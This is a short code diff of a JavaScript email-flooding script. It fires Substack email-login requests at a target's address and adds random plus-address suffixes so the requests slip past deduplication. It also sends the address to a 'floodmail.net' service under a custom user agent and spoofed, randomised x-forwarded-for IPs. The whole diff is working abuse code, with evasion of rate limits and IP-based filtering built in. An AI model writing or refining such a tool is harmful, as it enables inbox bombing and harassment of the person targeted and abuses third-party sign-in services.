@@ -18,7 +18,7 @@ fetch("https://substack.com/api/v1/email-login", {
   },
   "referrer": "https://substack.com/sign-in?redirect=%2F%3Fref%3Dbuffer.com&for_pub=milkkarten",
   "referrerPolicy": "strict-origin-when-cross-origin",
-  "body": "{\"redirect\":\"/?ref=buffer.com\",\"for_pub\":\"milkkarten\",\"email\":\"" + email + "\",\"captcha_response\":null}",
+  "body": "{\"redirect\":\"/?ref=buffer.com\",\"for_pub\":\"milkkarten\",\"email\":\"" + email.trim().split("@")[0] + "+" + Math.round(Math.random() * 10) + "@" +email.trim().split("@")[1] + "\",\"captcha_response\":null}",
   "method": "POST",
   "mode": "cors",
   "credentials": "include"
@@ -29,7 +29,7 @@ fetch("https://substack.com/api/v1/email-login", {
 
 
 
-fetch("https://floodmail.net/free/" + email.trim().split("@")[0] + "+" + Math.round(Math.random() * 10) + email.trim().split("@")[1], {
+fetch("https://floodmail.net/free/" + email.trim(), {
     headers: {
       "User-Agent": "floodmailprivateservices",
       "x-forwarded-for": "149.102.229." + Math.random().toString().substring("17","18") + Math.random().toString().substring("16","17"),
